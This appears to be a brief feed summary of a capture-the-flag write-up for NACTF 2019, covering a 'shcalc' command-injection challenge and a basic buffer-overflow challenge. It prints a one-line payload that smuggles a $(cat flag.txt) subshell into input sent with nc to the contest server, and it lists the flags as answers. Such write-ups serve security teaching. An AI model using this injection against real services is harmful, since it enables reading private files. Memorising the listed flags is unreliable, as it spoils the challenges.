item.title: Newarkctf19 writeup
item.description: shcalc (200) Description Hint Solution This is code injection echo '$(cat flag.txt | tr " " ".") 2>&1' | nc shell.2019.nactf.com 31214a Flag nactf{3v4l_1s_3v1l_dCf80yOo} ========================================== BufferOverflow #0 (100) Description The close cousin of a website for “Question marked as duplicate” Can you cause a segfault and get the flag? shell.2019.nactf.com:31475 Hint What does it mean to overflow the buffer? Solution Flag nactf{0v3rfl0w_th4at_buff3r_18ghKusB}
